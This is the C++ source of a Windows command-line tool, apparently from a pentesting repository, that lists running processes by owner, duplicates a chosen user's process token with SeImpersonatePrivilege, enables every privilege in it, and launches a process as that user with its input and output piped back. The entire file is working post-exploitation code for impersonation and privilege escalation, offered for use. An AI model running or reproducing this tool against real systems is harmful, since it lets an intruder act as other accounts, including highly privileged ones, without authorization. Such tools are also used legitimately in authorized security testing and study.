#include <Windows.h>
#include <iostream>
#include <tlhelp32.h>
#include "LinkedList.h"
#include "StringLinkedList.h"
#include "DictionaryOfLists.h"
#include "TokenPrivilegeManager.h"
#include <thread>

#define MAX_DISPLAY_PROCESS_PER_USER 4

using namespace std;

HANDLE NewProcStdoutWrH = NULL, NewProcStdoutRdH = NULL, NewProcStdinRdH = NULL, NewProcStdinWrH = NULL;
BOOL IsRunning = true;

BOOL WINAPI HandlerRoutine(_In_ DWORD dwCtrlType) {
    switch (dwCtrlType)
    {
        case CTRL_C_EVENT:
            IsRunning = false;        
        default:
            return false;
    }
}

typedef struct _ProcessInfo {
    INT PID = NULL;
    PSID SID_OwnerP = NULL;
    PCHAR Domain_User_Name;
    PWCHAR Name_Process;
    size_t Domain_User_Name_Len = 0, Name_Process_Len = 0;
}ProcessInfo, * PProcessInfo;

void PrintError() {
    cout << "    Error: " << GetLastError() << endl;
}

void DeallocProcessInfo(PProcessInfo Process) {
    Process->PID = NULL;

    if (Process->Domain_User_Name_Len != 0) {
        delete[]Process->Domain_User_Name;
    }

    if (Process->Name_Process_Len != 0) {
        delete[]Process->Name_Process;
    }
}

PCHAR CombineUserDomainName(PCHAR DomainName, PCHAR UserName) {
    size_t DomainNameLength, UserNameLength, DomainUserNameLength;
    PCHAR CombinedUserDomainName;

    StringCchLengthA(DomainName, STRSAFE_MAX_CCH, &DomainNameLength);
    StringCchLengthA(UserName, STRSAFE_MAX_CCH, &UserNameLength);
    DomainUserNameLength = DomainNameLength + UserNameLength + 2;

    CombinedUserDomainName = new CHAR[DomainUserNameLength];
    StringCchCopyA(CombinedUserDomainName, DomainUserNameLength, DomainName);
    StringCchCatA(CombinedUserDomainName, DomainUserNameLength, (PCHAR)"\\");
    StringCchCatA(CombinedUserDomainName, DomainUserNameLength, UserName);

    return CombinedUserDomainName;
}

void PrintUsage(PWCHAR* argv) {
    wchar_t* Filename = NULL, * Token, * Context;
    Token = wcstok_s(argv[0], L"\\", &Context);
    while (Token != NULL) {
        Filename = Token;
        Token = wcstok_s(NULL, L"\\", &Context);
    }
    wcout << L"TokenImpersonator does as it says - it helps you impersonate the primary token of a running process and then launch your desired process with it, thus impersonating another user." << endl;
    wcout << endl << L"You MUST have 'SeImpersonatePrivilege' for this to work; enabled/disabled doesn't matter, this program enables it for you." << endl;
    wcout << endl << L"Usage: " << Filename << L" \"process-to-launch {args}\" (window|nowindow) (pipe|nopipe)." << endl;
    wcout << endl << L"Author: CaptainWoof\nDetailed usage: https://github.com/captain-woof/PowerWoof (inside 'Tools')" << endl;
}

PProcessInfo GetProcessInfo(PPROCESSENTRY32 ProcessEntry32P) {
    PProcessInfo Process = new ProcessInfo;
    HANDLE ProcessH, ProcessTokenH;

    Process->PID = ProcessEntry32P->th32ProcessID;
    StringCchLengthW(ProcessEntry32P->szExeFile, 260, &Process->Name_Process_Len);
    Process->Name_Process = new WCHAR[Process->Name_Process_Len + 1];
    StringCchCopyW(Process->Name_Process, Process->Name_Process_Len + 1, ProcessEntry32P->szExeFile);
    ProcessH = OpenProcess(PROCESS_QUERY_INFORMATION, false, Process->PID);
    if (ProcessH == NULL) {
        DeallocProcessInfo(Process);
        return Process;
    }
    if (!OpenProcessToken(ProcessH, TOKEN_QUERY, &ProcessTokenH)) {
        CloseHandle(ProcessH);
        DeallocProcessInfo(Process);
        return Process;
    }

    DWORD ProcessTokenOwnerSize;
    PTOKEN_OWNER ProcessTokenOwnerP;
    if (!GetTokenInformation(ProcessTokenH, TokenOwner, NULL, 0, &ProcessTokenOwnerSize)) {
        ProcessTokenOwnerP = (PTOKEN_OWNER)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, ProcessTokenOwnerSize);
        if (ProcessTokenOwnerP == NULL) {
            cout << "[!] Could not allocate " << ProcessTokenOwnerSize << " bytes memory to receive process token owner information !" << endl;
            CloseHandle(ProcessH);
            CloseHandle(ProcessTokenH);
            HeapFree(GetProcessHeap(), NULL, ProcessTokenOwnerP);
            DeallocProcessInfo(Process);
            return Process;
        }
        if (!GetTokenInformation(ProcessTokenH, TokenOwner, ProcessTokenOwnerP, ProcessTokenOwnerSize, &ProcessTokenOwnerSize)) {
            CloseHandle(ProcessH);
            CloseHandle(ProcessTokenH);
            HeapFree(GetProcessHeap(), NULL, ProcessTokenOwnerP);
            DeallocProcessInfo(Process);
            return Process;
        }
        Process->SID_OwnerP = ProcessTokenOwnerP->Owner;
        HeapFree(GetProcessHeap(), NULL, ProcessTokenOwnerP);
    }

    DWORD owner_name_bufsize = 0, domain_name_bufsize = 0;
    SID_NAME_USE SidType;
    PCHAR Username = NULL, Domain = NULL;
    if (!LookupAccountSidA(NULL, Process->SID_OwnerP, Username, &owner_name_bufsize,
        Domain, &domain_name_bufsize, &SidType)) {        
        Username = new CHAR[owner_name_bufsize];
        Domain = new CHAR[domain_name_bufsize];

        if (!LookupAccountSidA(NULL, Process->SID_OwnerP, Username, &owner_name_bufsize, Domain, &domain_name_bufsize, &SidType)) {
            CloseHandle(ProcessH);
            CloseHandle(ProcessTokenH);
            DeallocProcessInfo(Process);
            return Process;
        }
        Process->Domain_User_Name = CombineUserDomainName(Domain, Username);
    }
    CloseHandle(ProcessH);
    CloseHandle(ProcessTokenH);
    
    return Process;
}

void EnumerateRunningProcesses(DictionaryOfListsA* RunningProcesses) {
    HANDLE CurrentProcessesSnapshotH = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
    PROCESSENTRY32 ProcessEntry32;
    ProcessEntry32.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(CurrentProcessesSnapshotH, &ProcessEntry32)) {
        cout << "[!] Could not list running processes !" << endl;
        PrintError();
        CloseHandle(CurrentProcessesSnapshotH);
        exit(0);
    }
    PProcessInfo Process = new ProcessInfo;
    Process = GetProcessInfo(&ProcessEntry32);
    if (Process->PID != NULL) {
        RunningProcesses->Add(Process->Domain_User_Name, Process);
    }
    while (Process32Next(CurrentProcessesSnapshotH, &ProcessEntry32)) {
        Process = new ProcessInfo;
        Process = GetProcessInfo(&ProcessEntry32);
        if (Process->PID != NULL) {
            RunningProcesses->Add(Process->Domain_User_Name, Process);
        }
    }
    CloseHandle(CurrentProcessesSnapshotH);
}

BOOL CheckForRequiredPrivileges() {    
    HANDLE CurrentProcessH = OpenProcess(PROCESS_QUERY_INFORMATION, false, GetCurrentProcessId());
    if (CurrentProcessH == NULL) {
        return false;
    }
    HANDLE CurrentProcessTokenH;
    if (!OpenProcessToken(CurrentProcessH, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &CurrentProcessTokenH)) {
        CloseHandle(CurrentProcessH);
        return false;
    }
    TokenPrivilegeManager PrivilegeManager(CurrentProcessTokenH);
    if (PrivilegeManager.IsPrivilegePresent("SeImpersonatePrivilege")){
        PrivilegeManager.ChangePrivilegeAttribute("SeImpersonatePrivilege", true);
    }

    CloseHandle(CurrentProcessTokenH);
    CloseHandle(CurrentProcessH);
        return true;
}

int ImpersonateTokenAndSpawnNewProcess(int TargetPid, PWCHAR ProcessToLaunch, BOOL WindowNeeded, BOOL PipingNeeded) {
    HANDLE TargetProcH = NULL, TargetProcTokenH = NULL, NewTokenH = NULL;
    STARTUPINFO StartupInfo;
    PROCESS_INFORMATION ProcessInformation;
    ZeroMemory(&StartupInfo, sizeof(STARTUPINFO));
    ZeroMemory(&ProcessInformation, sizeof(PROCESS_INFORMATION));
    StartupInfo.cb = sizeof(STARTUPINFO);

    TargetProcH = OpenProcess(PROCESS_QUERY_INFORMATION, true, TargetPid);
    if (TargetProcH == NULL) {
        cout << "        Failed to get target process handle !" << endl << "    ";
        PrintError();
        return -1;
    }
    if (!OpenProcessToken(TargetProcH, TOKEN_DUPLICATE, &TargetProcTokenH)) {
        cout << "        Failed to get target process token !" << endl << "    ";
        PrintError();
        CloseHandle(TargetProcH);
        return -1;
    }
    if (!DuplicateTokenEx(TargetProcTokenH, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &NewTokenH)) {
        cout << "        Failed to duplicate target process's token !" << endl << "    ";
        PrintError();
        CloseHandle(TargetProcTokenH);
        CloseHandle(TargetProcH);
        return -1;
    }
    LONG ProcessCreationFlags = 0;
    if (WindowNeeded) {
        ProcessCreationFlags = CREATE_NEW_CONSOLE | CREATE_NEW_PROCESS_GROUP;
    }
    else {
        ProcessCreationFlags = CREATE_NO_WINDOW;
    }
    // Enable all privileges in new token
    TokenPrivilegeManager PrivilegeManager(NewTokenH);
    PrivilegeManager.EnableAllPrivileges();
    if (PipingNeeded) {
        StartupInfo.hStdOutput = NewProcStdoutWrH;
        StartupInfo.hStdError = NewProcStdoutWrH;
        StartupInfo.hStdInput = NewProcStdinRdH;
        StartupInfo.dwFlags |= STARTF_USESTDHANDLES;
    }
    if (!CreateProcessWithTokenW(NewTokenH, LOGON_WITH_PROFILE, NULL, ProcessToLaunch, ProcessCreationFlags, NULL, NULL,
        &StartupInfo, &ProcessInformation)) {
        cout << "        Failed to create new process !" << endl << "    ";
        PrintError();
        CloseHandle(TargetProcTokenH);
        CloseHandle(TargetProcH);
        CloseHandle(NewTokenH);
        return -1;
    }    
    return ProcessInformation.dwProcessId;
}

BOOL DoStringsMatch(PCHAR s1, PCHAR s2) {
    if (strcmp(s1, s2)) {
        return false;
    }
    else {
        return true;
    }
}

void StdoutHandler() {
    HANDLE CurrentProcStdout = GetStdHandle(STD_OUTPUT_HANDLE);
    WCHAR* buf = new WCHAR[2048];
    DWORD bytesRead = 0, bytesWritten = 0;
    while (IsRunning) {
        if (ReadFile(NewProcStdoutRdH, buf, 2048, &bytesRead, NULL)) {
            WriteFile(CurrentProcStdout, buf, bytesRead, &bytesWritten, NULL);
            ZeroMemory(buf, sizeof(buf));
        }
        else {
            if (GetLastError() == ERROR_BROKEN_PIPE) {
                IsRunning = false;
                break;
            }
        }
    }
}

void StdinHandler() {
    HANDLE CurrentProcStdin = GetStdHandle(STD_INPUT_HANDLE);
    WCHAR* buf = new WCHAR[2048];
    DWORD bytesRead = 0, bytesWritten = 0;
    while (IsRunning) {
        if (ReadFile(CurrentProcStdin, buf, 2048, &bytesRead, NULL)) {
            WriteFile(NewProcStdinWrH, buf, bytesRead, &bytesWritten, NULL);
            ZeroMemory(buf, sizeof(buf));
        }
        else {
            if (GetLastError() == ERROR_BROKEN_PIPE) {
                IsRunning = false;
                break;
            }
        }
    }
}

int wmain(int argc, PWCHAR* argv)
{
    // Check args
    // Token-Impersonator-NewProcess.exe PROCESSNAME window|nowindow pipe|nopipe
    if (argc != 4) {
        PrintUsage(argv);
        return 0;
    }

    // Parse args
    PWCHAR ProcessToLaunch = argv[1];
    BOOL WindowNeeded = false;
    if (!((wcscmp(argv[2], L"window")) && (wcscmp(argv[2], L"WINDOW")))) {
        WindowNeeded = true;
    }
    BOOL PipingNeeded = false;
    if (!((wcscmp(argv[3], L"pipe")) && (wcscmp(argv[3], L"PIPE")))) {
        PipingNeeded = true;
    }

    // Check for privileges
    if (!CheckForRequiredPrivileges()) {
        cout << "[-] 'SeImpersonatePrivilege' is missing !" << endl;
        exit(0);
    }
    else {
        cout << "[+] 'SeImpersonatePrivilege' is present and enabled !" << endl;
    }

    // Enumerate all running processes
    DictionaryOfListsA RunningProcesses;
    RunningProcesses.SetCleanupRequiredInKeys(true);
    RunningProcesses.SetCleanupRequiredInLists(true);
    EnumerateRunningProcesses(&RunningProcesses);

    // Display all running processes
    // n) DOMAIN\USER
    // Process1.exe(PID) ...
    LinkedList* List;
    PProcessInfo ProcInfo;
    int t = 0;

    cout << endl << "[+] FOUND PROCESSES:" << endl;
    for (int i = 0; i < RunningProcesses.GetNumOfKeys(); i++) {
        List = (LinkedList*)RunningProcesses.GetList(i);
        cout << "   " << i << ") " << RunningProcesses.GetKey(i) << ":" << endl << "   ";
        if (List->GetSize() == 0) {
            cout << "No processes found !";
        }
        else {
            for (int j = 0; j < List->GetSize(); j++) {
                if (t < MAX_DISPLAY_PROCESS_PER_USER) {
                    ProcInfo = ((PProcessInfo)(List->GetElementP(j)));
                    wcout << ProcInfo->Name_Process << ", ";
                    t++;
                }
                else {
                    t = 0;
                    break;
                }
            }
        }
        if (List->GetSize() < 5) {
            cout << endl;
        }
        else {
            cout << "..." << endl;
        }        
    }

    // Ask for target user to impersonate
    int Key;
    cout << endl << "Enter which user (#num) to impersonate : ";
    cin >> Key;
    if (Key >= RunningProcesses.GetNumOfKeys()) {
        cout << "Invalid option !" << endl;
        exit(0);
    }
    cout << endl;

    // Impersonation starts    
    int NewProcessPid = -1;
    
    SECURITY_ATTRIBUTES SecurityAttribute;
    SecurityAttribute.bInheritHandle = true;
    SecurityAttribute.lpSecurityDescriptor = NULL;
    SecurityAttribute.nLength = sizeof(SECURITY_ATTRIBUTES);

    thread *StdoutHandlingThread = NULL, *StdinHandlingThread = NULL;

    if (PipingNeeded) {
        if((!CreatePipe(&NewProcStdoutRdH, &NewProcStdoutWrH, &SecurityAttribute, 0)) || !(CreatePipe(&NewProcStdinRdH, &NewProcStdinWrH, &SecurityAttribute, 0))){
            cout << "[-] Failed to create IO pipes for target prcoess !" << endl;
            PipingNeeded = false;
        }
        else {
            cout << "[+] Created pipes for IO interaction with new process to be spawned" << endl;
            StdoutHandlingThread = new thread(StdoutHandler);
            StdinHandlingThread = new thread(StdinHandler);
        }
    }
                        
    cout << endl << "[+] Impersonating '" << RunningProcesses.GetKey(Key) << "'" << endl;
    for (int i = 0; i < RunningProcesses.GetNumOfKeys(); i++) {
        List = (LinkedList*)RunningProcesses.GetList(i);
        for (int j = 0; j < List->GetSize(); j++) {
            ProcInfo = ((PProcessInfo)(List->GetElementP(j)));
            if (DoStringsMatch(ProcInfo->Domain_User_Name, RunningProcesses.GetKey(Key))) {   
                wcout << "    [+] Trying '" << ProcInfo->Name_Process << "'..." << endl;
                NewProcessPid = ImpersonateTokenAndSpawnNewProcess(ProcInfo->PID, ProcessToLaunch, WindowNeeded, PipingNeeded);
                if (NewProcessPid != -1) {
                    // End
                    cout << endl << "[+] New process successfully spawned !" << endl << "PID: " << NewProcessPid << endl;
                    cout << endl << ">> Written by CaptainWoof" << endl;
                    if (PipingNeeded) {
                        cout << endl << "Redirecting IO from newly spawned process..." << endl;
                        SetConsoleCtrlHandler(HandlerRoutine, TRUE);
                        StdoutHandlingThread->join();
                        delete StdoutHandlingThread;
                        StdinHandlingThread->join();
                        delete StdinHandlingThread;
                        CloseHandle(NewProcStdoutWrH);
                        CloseHandle(NewProcStdoutRdH);
                        CloseHandle(NewProcStdinRdH);
                        CloseHandle(NewProcStdinWrH);
                    }
                    exit(0);
                }
            }
        }        
    }
    delete StdoutHandlingThread;
    delete StdinHandlingThread;
    CloseHandle(NewProcStdoutWrH);
    CloseHandle(NewProcStdoutRdH);
    CloseHandle(NewProcStdinRdH);
    CloseHandle(NewProcStdinWrH);
    exit(0);
}
